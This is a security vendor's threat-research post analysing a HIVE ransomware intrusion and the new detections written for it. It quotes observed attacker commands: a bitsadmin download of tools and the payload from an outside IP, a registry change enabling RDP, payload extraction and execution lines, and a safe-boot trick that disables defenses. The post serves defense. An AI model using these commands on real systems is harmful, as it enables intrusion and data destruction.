                            <h3 id="how-malicious-actors-evade-detection-and-disable-defenses-for-more-destructive-hive-ransomware-attacks-">How malicious actors evade detection and disable defenses for more destructive HIVE Ransomware attacks.</h3><p>Rapid7 routinely conducts research into the wide range of techniques that threat actors use to conduct malicious activity. One objective of this research is to discover new techniques being used in the wild, so we can develop new detection and response capabilities.</p><p>Recently, Rapid7 observed a malicious actor performing several known techniques for distributing <a href="https://www.rapid7.com/fundamentals/what-is-ransomware/">ransomware</a> across many systems within a victim’s environment. In addition to those techniques, the actor employed a number of previously unseen techniques designed to to drop the defenses of the victim, inhibit monitoring, disable networking and allow time for the ransomware to finish encrypting files. These extra steps would make it extremely difficult, if not impossible, for a victim to effectively use their security tools to defend endpoints after a certain point in the attack. </p><p>Rapid7 has updated existing and added new detections to InsightIDR to defend against these techniques. In this article, we’ll explore the techniques employed by the threat actor, why they’re so effective, and how we’ve updated InsightIDR to protect against them.</p><h3 id="what-approach-did-the-malicious-actor-take-to-prepare-the-victim-s-environment">What approach did the malicious actor take to prepare the victim's environment?</h3><p>Initially using <a href="https://www.cobaltstrike.com/">Cobalt Strike</a>, the malicious actor retrieved system administration tools and malicious payloads by using the Background Intelligent Transfer Service (<a href="https://learn.microsoft.com/en-us/windows/win32/bits/bitsadmin-tool">BITSAdmin</a>).</p><!--kg-card-begin: markdown--><pre><code>&quot;C:\Windows\system32\bitsadmin.exe&quot; /transfer debjob /download /priority normal http://79.137.206.47/PsExec.exe C:\Users\Public\PsExec.exe

bitsadmin  /transfer debjob /download /priority normal http://79.137.206.47/int.exe C:\Windows\int.exe
</code></pre>
<!--kg-card-end: markdown--><p>The malicious actor then began using the remote process execution tool <a href="https://learn.microsoft.com/en-us/sysinternals/downloads/psexec">PSExec</a> to execute batch files (<code>rdp.bat</code>) that would cause registry changes to <a href="https://learn.microsoft.com/en-us/windows-hardware/customize/desktop/unattend/microsoft-windows-terminalservices-localsessionmanager-fdenytsconnections">enable Remote Desktop</a> sessions (RDP) using <code>reg.exe</code>. This enabled the malicious actor to laterally move throughout the victim’s environment using the graphical user interface.</p><!--kg-card-begin: markdown--><pre><code>PSEXESVC.exe: C:\Windows\PSEXESVC.exe└──cmd.exe: C:\Windows\system32\cmd.exe /c &quot;&quot;rdp.bat&quot; &quot;└── reg.exe: reg  add &quot;HKLM\System\CurrentControlSet\Control\Terminal Server&quot; /v &quot;fDenyTSConnections&quot; /t REG_DWORD /d 0 /f
</code></pre>
<!--kg-card-end: markdown--><p>Rapid7 observed the malicious actor add/change policies for the Active Directory domain to perform the following:</p><ol><li>Copy down batch scripts</li><li>Execute batch scripts (<code>file1.bat</code>), which:</li><li>Creates administrator account on the local system</li><li>Reconfigures <a href="https://learn.microsoft.com/en-us/windows-server/administration/windows-commands/bcdedit">boot configuration data</a> (<code>bcdedit.exe</code>) so that the host will not load any additional drivers or services (ie: network drivers or <a href="https://www.rapid7.com/solutions/endpoint-detection-and-response/">endpoint protection</a>)</li><li>Sets various registry values to ensure the created local administrator user will automatically logon by default</li><li>Changes the <a href="https://en.wikipedia.org/wiki/Windows_shell">Windows Shell</a> from Explorer to their malicious script (<code>file2.bat</code>)</li><li>Reboots the system with the shutdown command</li><li>On reboot, the system logs in and executes the shell (<code>file2.bat</code>), which:</li><li>Extracts HIVE ransomware payload(s) from an encrypted archive (<code>int.7z</code>) using 7-Zip's console executable (<code>7zr.exe</code>)</li><li>Executes the ransomware payload (<code>int.exe or int64.exe</code>)</li></ol><p>Below are some commands observed executed by the malicious actor (with necessary redactions):</p><!--kg-card-begin: markdown--><pre><code>xcopy.exe /C/Q/H/Y/Z 
&quot;\\&lt;REDACTED&gt;\sysvol\&lt;REDACTED&gt;\Policies {&lt;REDACTED&gt;}\Machine\Scripts\Startup\file1.bat&quot; &quot;C:\windows&quot;
xcopy.exe /C/Q/H/Y/Z 
&quot;\\&lt;REDACTED&gt;\sysvol\&lt;REDACTED&gt;\Policies\{&lt;REDACTED&gt;}\Machine\Scripts\Startup\file2.bat&quot; &quot;C:\windows&quot;

<!--kg-card-end: markdown--><p>Rapid7 also observed the malicious actor extracting HIVE ransomware payload using 7zip's console application (<code>7zr.exe</code>) from encrypted 7zip archive (<code>int.7z</code>) with a simple password (<code>123</code>):</p><p><code>"C:\windows\7zr.exe" x c:\windows\int.7z -p123 -oc:\windows</code><br><br>The malicious actor then manually executed the ransomware (<code>int.exe</code>) once with only the required username:password combination passed to the <code>-u</code> flag. This presumably encrypted the local drive and also all network shares the user had access to:</p><p><code>"C:\Windows\int.exe" -u &lt;REDACTED&gt;:&lt;REDACTED&gt;"</code></p><p>The malicious actor also manually executed the 64 bit version of the ransomware (<code>int64.exe</code>) once on a different host with the <code>-no-discovery flag</code>. This is likely intended to override the default behavior and not discover network shares to encrypt their files. The <code>-u</code> flag was also passed and the same values for the username:password were provided as seen on the other host.</p><p><code>C:\Windows\int64.exe  -u &lt;REDACTED&gt;:&lt;REDACTED&gt; -no-discovery</code></p><h3 id="why-is-the-hive-ransomware-approach-so-effective">Why is the HIVE Ransomware approach so effective?</h3><p>Deployment of ransomware using Active Directory group policies allows the malicious actor to hit all systems in the environment for as long as that group policy is active in the victim’s environment. In this case, any system that was booting and connected to the environment would receive the configuration changes, encrypted archive containing the ransomware, a decompression utility to extract the ransomware, configuration changes and the order to reboot and execute. This can be especially effective if timed with deployments of patches that require a reboot, done at the beginning of the day or even remotely using <a href="https://learn.microsoft.com/en-us/powershell/module/microsoft.powershell.management/stop-computer?view=powershell-7.3">Powershell's Stop-Computer cmdlet</a>.</p><p>Storing the ransomware within a 7zip encrypted archive  (<code>int.7z</code>) with a password even as simple as (<code>123</code>) makes the task of identifying the ransomware on disk or transmitted across the network nearly impossible. This makes retrieval and staging of the malicious actors payload very difficult to spot by security software or devices (Antivirus, Web Filtering, IDS/IPS and more). In this case, the malicious actor has taken care to only put the encrypted copy on the disk of a victim’s system and not execute it until they have fully dropped the defenses on the endpoint.</p><p>Reconfiguring the default boot behavior to safeboot minimal and then executing a reboot unloads all but the bare minimum for the Windows operating system. With no additional services, software or drivers loaded the system is at its most vulnerable. With no active defenses (Antivirus or Endpoint Protection) the system comes up and tries to start its defined shell which has been swapped to a batch script (<code>file2.bat</code>) by the malicious actor. </p><p>It should be noted that in this state, <strong>there is no method of remotely interacting with the system as no network drivers are loaded. In order to respond and halt the ransomware, each host must be physically visited for shutdown. </strong>Manually priming the host in this way is more effective than the existing capabilities of the HIVE ransomware which stops specific defensive services (Windows Defender, etc) and kills specific processes prior to encrypting the contents of the drive.</p><p> All systems in this state are left automatically logged in as an administrator, which gives anyone who has physical access complete control. Lastly, the system will continue to boot into safeboot minimal mode by default (again, no networking) until each system is set back to its original state with a command such as below. Bringing the host back online in this state will still continue to execute the malware when logged into, which will also enable the default network spreading behavior.</p><p><code>bcdedit /deletevalue {default} safeboot</code></p><p>Lastly, the malicious actor also manually executed the payload a few times on systems that had not been put into <code>safeboot minimal</code> and rebooted. Systems they executed with only the <code>-u</code> flag actively searched out network shares they had access to and encrypted their contents. This ensures that only the intended hosts do network share encryption and all those that were rebooted into safeboot minimal do not flood the network simultaneously encrypting all files. It also means that the contents of network file shares that are not Windows based (various NAS devices, Linux hosts using Samba) will be encrypted even if the payload is not actually deployed on that specific host. This approach would be extremely destructive to both corporate environments and home users with network attached storage systems for backups. Rapid7 notes that <a href="https://threatlocker.com/">ThreatLocker</a> have reported on similar activity in their knowledge base article entitled <a href="https://threatlocker.kb.help/preventing-bcdedit-from-being-weaponized/">Preventing BCDEdit From Being Weaponized</a>.</p><h3 id="malware-analysis-of-hive-sample">Malware analysis of HIVE sample</h3><p>Rapid7 observed that the HIVE payload would not execute unless a flag of -u was passed. During analysis it was discovered that passing -u asdf:asdf would result in the Login and Password (colon-delimited) provided to the victim to authenticate to the site behind the onion link on the TOR network:</p><figure class="kg-card kg-image-card"><img src="https://lh3.googleusercontent.com/1dEgM5XEM9gTYqp3b0XEbMPtSGyJ67An4XaUi8lYfnZGbA81EmTEeP40esolpjAJ3zuc20FNAM8rtVO8ghUMtu41Nko1Sp1KcHr1rvoRRWKNgu7jXftvancKuioZri3Xs4oFVBvBO3UpNZ7FrUv4b9IOifmmoqoJkn_goxu3gicgc-dvG1A1sP9fAcjzPg" class="kg-image"></figure><p><br>This, and other behaviors were previously reported on by Microsoft's article <a href="https://www.microsoft.com/en-us/security/blog/2022/07/05/hive-ransomware-gets-upgrades-in-rust/">Hive Ransomware Gets Upgrades in Rust</a> and also by Sophos in their <a href="https://github.com/sophoslabs/IoCs/blob/master/Ransomware_Hive%20-%20triple%20ransomware%20attack.csv">Github Repository of IoC's</a> mentioned in their article <a href="https://news.sophos.com/en-us/2022/08/10/lockbit-hive-and-blackcat-attack-automotive-supplier-in-triple-ransomware-attack/">Lockbit, Hive, and BlackCat attack automotive supplier in triple ransomware attack</a>. There have been some flags that are noted to exist, but their features are not documented. Rapid7 has analyzed the behaviors of these flags, documented them in addition to discovering two new flags (<code>-timer, -low-key</code>) in the HIVE ransomware samples.</p><p>The new flags <code>-t, -timer, --timer</code> effectively cause the malware to wait the specified number of seconds before going on to perform its actions. The other new flags <code>-low-key, --low-key</code> will cause the ransomware to focus on only its encryption of data and not perform pre-encryption tasks, including deleting shadow copies (malicious use of <code>vssadmin.exe, wmic.exe</code>), deleting backup catalogs (malicious use of <code>wbadmin.exe</code>), and disabling Windows Recovery Mode (malicious use of <code>bcdedit.exe</code>). These features give the malicious actor more control over how/when the payload is executed and skirt common methods of command line and parent/child process related detection for most ransomware families. </p><p>Fundamentally, the sample’s respective flags distill down into encryption operations of <code>local</code>, <code>mount</code> and <code>discovery</code>.  The local module utilizes the <a href="https://learn.microsoft.com/en-us/windows/win32/api/winbase/nf-winbase-lookupprivilegevaluew">LookupPrivilegeValueW</a> and <a href="https://learn.microsoft.com/en-us/windows/win32/api/securitybaseapi/nf-securitybaseapi-adjusttokenprivileges">AdjustTokenPrivileges</a> that Windows API calls on its own process via <a href="https://learn.microsoft.com/en-us/windows/win32/api/processthreadsapi/nf-processthreadsapi-getcurrentprocess">GetCurrentProcess</a> and <a href="https://learn.microsoft.com/en-us/windows/win32/api/processthreadsapi/nf-processthreadsapi-openprocesstoken">OpenProcessToken</a> to obtain SeDebugPrivilege privileges.  This is presumably crucial for <a href="https://learn.microsoft.com/en-us/windows/win32/api/processthreadsapi/nf-processthreadsapi-openprocess#remarks:~:text=To%20open%20a%20handle%20to%20another%20local%20process%20and%20obtain%20full%20access%20rights%2C%20you%20must%20enable%20the%20SeDebugPrivilege%20privilege.%20For%20more%20information%2C%20see%20Changing%20Privileges%20in%20a%20Token.">OpenProcess</a> -&gt; <a href="https://learn.microsoft.com/en-us/windows/win32/api/processthreadsapi/nf-processthreadsapi-openprocesstoken">OpenProcessToken</a> -&gt; <a href="https://learn.microsoft.com/en-us/windows/win32/api/securitybaseapi/nf-securitybaseapi-impersonateloggedonuser">ImpersonateLoggedOnUser</a> API call attempts to processes: <code>winlogon.exe</code> and <code>trustedinstaller.exe</code> to subsequently stop security services and essential processes, if the <code>--low-key</code> is not passed during execution.  <a href="https://learn.microsoft.com/en-us/windows/win32/api/shellapi/nf-shellapi-shellexecutea">ShellExecuteA</a> is also used to launch various Windows binaries (<code>bcdedit.exe</code>, <code>notepad.exe</code>, <code>vssadmin.exe</code>, <code>wbadmin.exe</code>, <code>wmic.exe</code>) for destruction of backups and ransom note display purposes. The mount module will use <a href="https://learn.microsoft.com/en-us/windows/win32/api/lmuse/nf-lmuse-netuseenum">NetUseEnum</a> to identify the current list of locally-mounted network shares and add them to the list to be encrypted. Lastly, the discovery module will use <a href="https://learn.microsoft.com/en-us/windows/win32/api/lmserver/nf-lmserver-netserverenum">NetServerEnum</a> to identify available Windows hosts within the domain/workgroup. This list is then used with <a href="https://learn.microsoft.com/en-us/windows/win32/api/lmshare/nf-lmshare-netshareenum">NetShareEnum</a> to identify file shares on each remote host and add them to the list of locations to have their files encrypted.</p><p>By default, all three modes (<code>local</code>, <code>mount</code> and <code>discovery</code>)are enabled, so all local, mounted and shares able to be enumerated will have their contents encrypted. This effectively ransoms all systems in a victim’s environment with a single execution of HIVE—when performed by a privileged user such as a Domain or Enterprise Admin account. Command line flags may be used to change this behavior and invoke one or more of the modules.
